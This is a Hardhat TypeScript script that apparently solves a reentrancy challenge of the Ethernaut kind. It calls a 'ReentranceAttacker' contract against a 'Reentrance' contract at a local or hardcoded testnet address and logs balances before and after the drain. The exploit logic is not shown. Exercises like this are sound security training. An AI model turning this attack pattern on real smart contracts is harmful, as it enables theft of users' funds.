import { ethers, network } from "hardhat";
import { Reentrance, ReentranceAttacker } from "../typechain-types";

async function main() {
  let reentrace: Reentrance;
  const [_attacker] = await ethers.getSigners();

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const reentranceAttacker: ReentranceAttacker = await ethers.getContract(
    "ReentranceAttacker"
  );

  if (isLocalTest) {
    reentrace = await ethers.getContract("Reentrance");
  } else {
    reentrace = await ethers.getContractAt(
      "Reentrance",
      "0xaFf1971520934C2E9931673d1d9B66eAb4B8A1d7"
    );
  }

  await check();

  const tx = await reentranceAttacker.attack({
    value: ethers.utils.parseEther("0.001"),
  });

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-------------------------------------------------------");
  console.log("After attack");

  await check();

  async function check() {
    const balance = await ethers.provider.getBalance(reentrace.address);

    console.log(`Target balance: ${balance.toString()}`);

    const balanceAttacker = await reentrace.balanceOf(
      reentranceAttacker.address
    );
    console.log(`Attacker Balance: ${balanceAttacker.toString()}`);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
